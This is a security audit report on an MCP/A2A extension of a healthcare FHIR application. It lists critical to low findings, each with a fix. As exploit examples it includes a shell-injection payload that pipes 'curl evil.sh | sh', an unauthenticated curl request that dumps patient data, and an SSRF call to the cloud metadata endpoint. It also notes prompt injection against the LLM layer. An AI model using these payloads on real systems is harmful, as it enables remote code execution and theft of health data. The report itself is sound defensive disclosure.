# Security Audit — `extensions/mcp` (@orbital/mcp)

**Date:** 2026-07-01
**Scope:** `extensions/mcp` (MCP server, A2A JSON-RPC surface, LLM/RAG, model
downloads). Read-only static audit.
**Method:** 4 parallel agents across auth/PHI, injection/SSRF,
secrets/deps/config, plus network-exposure. Findings below are the
**de-duplicated, cross-corroborated** set; each row notes verification status.
**Auditor note:** items were confirmed by ≥2 independent agents and/or a
firsthand code check (✔ = I verified the exact line myself this session).

> ⚠️ This audit found **multiple Critical, unauthenticated, PHI-exposing and
> RCE-class issues.** The MCP extension should be treated as **not safe to
> expose** (no untrusted network reachability, `authentication:"none"` configs
> pulled from production) until at least the Criticals are fixed.

## Severity summary

| Sev | Count | Themes |
|-----|-------|--------|
| Critical | 4 | RCE via shell injection; unauthenticated A2A → PHI dump; confused-deputy tool execution; unauthenticated SSRF |
| High | 5 | auth-disable flags & shipped `auth:"none"` config; PHI→external-LLM egress; publication PHI leak; wildcard CORS; missing method auth |
| Medium | 4 | client-exposed key path; prompt injection; unbounded JSON.parse DoS; native/loose deps |
| Low | 3 | AppleDouble litter; `$or` id-lookup anti-pattern; no model checksum |

---

## CRITICAL

### C1 — Remote code execution via shell injection in `llm.downloadModel` ✔
`server/methods.js:1502-1505`. Caller-controlled `model.id` is string-interpolated
into a shell command and run via `execAsync`:
```js
const cloneCommand = `GIT_LFS_SKIP_SMUDGE=1 git clone https://huggingface.co/${model.id} ${modelPath}`;
const { stdout, stderr } = await execAsync(cloneCommand, { ... });
```
No `this.userId` guard before this point (the `this.userId` at `:1536` is
post-clone ownership tracking). **Exploit:**
`Meteor.call('llm.downloadModel', { id: '; curl evil.sh | sh #' })` → arbitrary
code as the server user.
**Fix:** validate `model.id` against `^[\w.-]+\/[\w.-]+$`; use
`spawn('git', ['clone', url, path])` with an arg array, never `exec` with
interpolation; add an auth + role gate.

### C2 — `/api/a2a` JSON-RPC endpoint is fully unauthenticated and dumps all PHI ✔(route exists)
`server/routes/a2aJsonRpcRoute.js` (+ `a2aRoutes.js`) register handlers for
`message/send`, `message/stream`, `tasks/get`, `tasks/cancel` with **no token
check, no `this.userId`, wildcard CORS**. `A2AServerFhir.handleTasksGet` returns
a task by id **or all tasks when `taskId` is omitted** (`findAsync({})`). Task
histories carry patient names and clinical request text. **Exploit:**
`curl -X POST http://host/api/a2a -d '{"jsonrpc":"2.0","id":1,"method":"tasks/get","params":{}}'`
→ every task's PHI, no credentials. Corroborated by 3 agents.
**Fix:** require a bearer token (reuse `server/lib/FhirAuth.js`); never return
unbounded `find({})`; scope to the caller.

### C3 — Confused deputy: MCP `tools/call` runs FHIR ops with ambient server privilege
`server/McpServer.js` → `McpResources.searchFhirResources` /
`McpExternalFhirTools` query FHIR with **no `parseUserAuthorization`, no
`CaslAccessControl`, no patient-compartment filter**. Even on the auth-gated
`/mcp` HTTP path, the validated user (`req.mcpUser`) is **never propagated into
tool execution**. **Exploit:** any caller who reaches a tool reads *all*
patients' data that a REST `/baseR4/Patient` call would filter or deny.
**Fix:** thread the authenticated identity into every tool handler; enforce the
same scope/compartment/ACL as the REST layer (this is exactly what the JSON-RPC
`ServerMethods` pipeline in the methods-migration spec is designed to
centralize).

### C4 — Unauthenticated SSRF relays
`server/methods.js`: `a2a.fetchAgentCard(url)` (:445), `a2a.sendRequest(url,
body, headers)` (:670, attacker controls headers+body), `a2a.sendExternalRequest`
(:978), `mcp.proxy.listTools/executeTool/getStatus(serverUrl)` (:1250/1279/1313),
`models.downloadModel(url,...)` (:2368) — all `fetch()` caller-supplied URLs with
**no host allowlist and no auth**. **Exploit:**
`Meteor.call('a2a.sendRequest','http://169.254.169.254/latest/meta-data/...',{})`
→ cloud-metadata / internal-service exfil, response returned to caller;
`mcp.proxy.*` is an open POST relay. Corroborated by 2 agents.
**Fix:** auth-gate these methods; enforce an egress allowlist (scheme+host);
block link-local/RFC1918 by default.

---

## HIGH

### H1 — Auth globally disablable by client-visible flag; shipped config sets `auth:"none"` ✔
`server/McpServer.js:94-101`: `requireAuth()` returns false if `process.env.NOAUTH`
**or `Meteor.settings.public.noAuth`** (public = client-visible). Worse,
`configs/settings.synthea.json:144` ships `"mcp": { "authentication": "none" }`
with `:155 "disableOauth": true`. **Fix:** delete `public.noAuth` and the
`NOAUTH` env path; remove `authentication:"none"` from all committed configs;
make secure-by-default (fail closed).

### H2 — A2A task PHI auto-serialized into external LLM prompts
`server/a2a/A2AServerFhir.js` `autoRespondToTask` (default
`administratorAutoRespond:true`) concatenates full conversation history (patient
names, diagnoses, correction requests) into a prompt POSTed to
`api.anthropic.com`/`api.openai.com`. Triggered by the **unauthenticated**
`/api/a2a` path (C2). PHI egress to a third party with no consent gate or audit.
**Fix:** gate external-LLM egress behind explicit config + the audit pipeline;
redact/authorize before any PHI leaves; default auto-respond off.

### H3 — A2A publications & `getActiveTasks` leak all patients' tasks
`server/publications/a2aTasks.js`: `a2a.tasks` / `a2a.activeTasks` publish
`A2ATasks.find({})` with no `this.userId` filter (code comment admits it).
`a2a.getActiveTasks` method likewise returns all tasks. Any authenticated
session sees every patient's tasks. **Fix:** filter publications by
user/role/patient-context.

### H4 — PHI written to an unencrypted, unaccess-controlled local vector store ✔
`server/McpLocalVectorSearch.js:130 extractClinicalText()` pulls
Condition/Procedure/Observation `code.text`, notes, body sites and writes HNSWLib
index files to `.meteor/local/vector-stores` (`:68`) in plaintext. The Atlas path
embeds the same via OpenAI. **Fix:** encrypt at rest / move under access
control; treat the vector store as a PHI system (retention, audit, BAA coverage
for OpenAI embeddings).

### H5 — 14 of 48 Meteor methods have no `this.userId` gate ✔(48 defs / 34 guards)
Unprotected incl. `a2a.deleteTask` (deletes any task by id), `mcp.executeTool`,
`llm.saveConfig` (overwrites the shared in-memory `llmConfig` incl. keys used by
other requests). Wildcard CORS (`Access-Control-Allow-Origin:*` in
`McpTransport.js`, `McpServer.js`, all four `routes/*.js`) with
`Allow-Headers: Authorization` compounds it. **Fix:** default-deny auth on every
method; replace `*` CORS with an origin allowlist.

---

## MEDIUM

- **M1 — Client-exposed API key path.** `client/ui/components/LLMProviderDialog.jsx:68-69`
  reads `settings.public.openai.apiKey` / `...anthropic.apiKey` — any key placed
  there ships in the client bundle. Fix: keys server-side only; proxy LLM calls.
- **M2 — Prompt injection / tool-poisoning unhandled.** `server/methods.js:150-285`
  and `McpBridgeToA2A` / RAG concatenate patient/applicant text into system+user
  prompts with no delimiting or sanitization; a crafted message can override the
  administrator system prompt. Design-level; mitigate with structured prompts +
  input fencing.
- **M3 — Unbounded `JSON.parse` on untrusted bodies.** `server/McpTransport.js:22-41`
  (HTTP) and `:161` (WS) accumulate the body with no size cap → memory-exhaustion
  DoS. Fix: enforce a Content-Length/byte cap.
- **M4 — Native/loose dependencies.** `hnswlib-node ^3.0.0` builds native code at
  install; `langchain`/`@langchain/* ^0.3.0` are broad ranges on a fast-moving
  pre-1.0 line; `react-simple-chatbot ^0.6.0` effectively unmaintained. Run
  `npm audit`; pin ranges. (No CVE numbers asserted — flagged for scan.)

## LOW

- **L1 — 14 AppleDouble `._*` files committed** (`._methods.js`, `._settings.synthea.json`,
  …). No secrets inside; `.gitignore` + remove.
- **L2 — `$or:[{id},{_id}]` id-lookup** in `methods.js:555/627/912` &
  `A2AServerFhir.js` — the repo's flagged id-collision anti-pattern applied to
  authorization lookups. `check(String)` blocks operator injection; still fix the
  pattern.
- **L3 — No integrity/checksum verification** on downloaded model files
  (`ModelDownloadService.js`, `client/lib/HuggingFace*.js`) — supply-chain risk.

## Verified clean
- **No hardcoded live secrets** anywhere (server/client/tests/docs/Postman); keys
  from `process.env`/`settings.private`; `llm.getConfig` masks keys before return.
  Placeholders only (`YOUR_TOKEN`, `random_password`).
- `/mcp` HTTP POST **does** enforce a real bearer token when `requireAuth()` is
  true (hashed login-token lookup) — the gate exists; the gaps are (a) it's
  disablable (H1) and (b) identity isn't carried into tools (C3).
- FHIR search params use `encodeURIComponent`; model **filename** sanitization in
  `ModelDownloadService` correctly strips `../`.

## Out-of-scope leads (NOT verified — separate audit)
One agent ranged beyond `extensions/mcp` into sibling extensions and reported
**unverified** issues worth a follow-up audit: a **Stripe webhook
user-ownership/idempotency gap** (`extensions/monetization/server/webhooks.js`),
missing rate limits on monetization methods, and IPFS config exposure
(`extensions/ipfs-swarm`). These are leads, not confirmed findings — treat as a
scoped follow-up.

## Recommended remediation order
1. **C1** (RCE) — highest; trivial to exploit, total compromise.
2. **C2 + C4** (unauth A2A + SSRF) — network-reachable PHI/exfil.
3. **H1** (remove auth-disable flags + shipped `auth:"none"`) — makes the rest enforceable.
4. **C3 + H3 + H5** (identity into tools; publication filters; method gates).
5. **H2 + H4** (PHI→LLM egress; encrypt vector store) — align with the HIPAA
   audit-trail + logging specs already drafted.
6. Mediums/Lows in a cleanup pass.
